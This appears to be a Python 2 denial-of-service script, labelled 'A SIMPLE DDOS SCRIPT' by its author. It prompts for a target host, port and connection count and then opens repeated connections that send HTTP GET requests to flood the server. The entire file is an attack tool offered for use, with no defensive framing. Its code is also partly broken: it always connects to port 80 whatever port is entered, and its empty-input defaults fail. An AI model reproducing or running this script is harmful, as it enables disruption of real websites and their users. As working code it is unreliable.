# Author : Hades.y2k
# Date   : 25/05/2015
# <OpenSource>

import httplib, socket, os, sys, string, time

print "THIS IS A SIMPLE DDOS SCRIPT BY PYTHON."

class engage():
    def __init__(self):
        self.dos()

    def dos(self):
        target = raw_input("Enter the target host : ")
        port = int(raw_input("Enter the port [80]: "))
        if not port: port = 80
        conn = int(raw_input("Enter the numbers of connection [300] : "))
        if not conn: conn = 300
        msg = raw_input("Enter message to send ['Hello World'] : ")
        if not msg : msg = "/* Hello World. */"

        try:
            webs = target.replace("http://", "")
            connec = httplib.HTTPConnection(webs)
            print "[+] Connecting the Website."
            connec.connect()
            print "[+] Connection Established, It's Online.\n"
        except (httplib.HTTPResponse, socket.error) as Exit:
            print "[!] Website cannot be connected.\n"
            sys.exit()

        print "[*] Engaged the DDoS Attack"
        print "[*] DDoS Attack Start in " + time.ctime() + "\n"

        def engaging():
            print "[!] Engaging the Target."
            ip = socket.gethostbyname(target)
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                ddos.connect((target, 80))
                ddos.send("GET /%s HTTP/1.1\r\n" % msg)
                ddos.sendto("GET /%s HTTP/1.1\r\n" % msg, (ip, port))
            except socket.error, KeyboardInterrupt:
                print "[!] Failed to Attack the Target. [!]"
            ddos.close()

        for x in xrange(conn):
            engaging()
        print "\n[*] DDoS Attack End in " + time.ctime() + "\n"

if __name__ == "__main__":
    engage()
